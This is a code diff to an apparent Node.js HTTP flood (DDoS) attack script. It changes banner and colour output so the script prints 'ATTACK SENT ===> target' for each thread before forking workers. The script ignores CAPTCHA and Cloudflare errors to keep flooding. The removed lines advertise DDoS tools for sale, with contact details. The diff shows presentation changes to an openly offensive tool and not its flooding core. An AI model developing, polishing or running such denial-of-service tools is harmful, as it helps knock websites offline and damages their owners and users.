@@ -43,7 +43,31 @@ controle_header = [
 ],
 ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError'],
 ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO'];
-
+const colors = {
+    reset: '\x1b[0m',
+    sang: '\x1b[1m',
+    dim: '\x1b[2m',
+    underscore: '\x1b[4m',
+    blink: '\x1b[5m',
+    reverse: '\x1b[7m',
+    hidden: '\x1b[8m',
+    den: '\x1b[30m',
+    do: '\x1b[31m',
+    luc: '\x1b[32m',
+    vang: '\x1b[33m',
+    lam: '\x1b[34m',
+    tim: '\x1b[35m',
+    cyan: '\x1b[36m',
+    trang: '\x1b[37m',
+    bgBlack: '\x1b[40m',
+    bgRed: '\x1b[41m',
+    bgGreen: '\x1b[42m',
+    bgYellow: '\x1b[43m',
+    bgBlue: '\x1b[44m',
+    bgMagenta: '\x1b[45m',
+    bgCyan: '\x1b[46m',
+    bgWhite: '\x1b[47m',
+  };
 process.on('uncaughtException', function (e) {
 if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
     //console.warn(e);
@@ -84,23 +108,22 @@ function proxyr() {
 if(cluster.isMaster) {
 const dateObj = new Date();
   
-    console.log(` █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ███████╗███████╗███╗   ██╗████████╗    ██████╗ ███╗   ███╗████████╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗
-██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝    ██╔══██╗████╗ ████║╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝
-███████║   ██║      ██║   ███████║██║     █████╔╝     ███████╗█████╗  ██╔██╗ ██║   ██║       ██║  ██║██╔████╔██║   ██║       ███████╗██║     ██████╔╝██║██████╔╝   ██║   
-██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ╚════██║██╔══╝  ██║╚██╗██║   ██║       ██║  ██║██║╚██╔╝██║   ██║       ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   
-██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║       ██████╔╝██║ ╚═╝ ██║   ██║       ███████║╚██████╗██║  ██║██║██║        ██║   
-╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝       ╚═════╝ ╚═╝     ╚═╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   
+console.log(` 
+ █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    ███████╗███████╗███╗   ██╗████████╗    
+██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    ██╔════╝██╔════╝████╗  ██║╚══██╔══╝   
+███████║   ██║      ██║   ███████║██║     █████╔╝     ███████╗█████╗  ██╔██╗ ██║   ██║      
+██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     ╚════██║██╔══╝  ██║╚██╗██║   ██║     
+██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    ███████║███████╗██║ ╚████║   ██║     
+╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝      
                                                                                                                                                                          
-SCRIPT HTTP-RAW | BUY TOOL DDOS IB ZALO : 0337021245 | GITHUB : DagTriZaker | Fb.com/dangtriofficial.3107  
+ATTACK: ${target}     TIME: ${time}     THREAD: ${thread}     
 
-----------------------------------------------------------------------------------------------------------------------
-ATTACK-SENT ! |DMT SCIPT|    
-ATTACK-SENT ! |DMT SCIPT|          
-ATTACK-SENT ! |DMT SCIPT| 
-ATTACK-SENT ! |DMT SCIPT| 
-ATTACK-SENT ! |DMT SCIPT|`);
+----------------------------------------------------------------------------------------------------------------------`);
 
-
+for (let i = 0; i < thread; i++) {
+    console.log(colors.sang + colors.luc +`ATTACK SENT`+ colors.vang + ` ===>`+ colors.do + ` ${target}`+ colors.reset);
+  }
+  
     for(var bb=0;bb<thread;bb++) {
 
         cluster.fork();
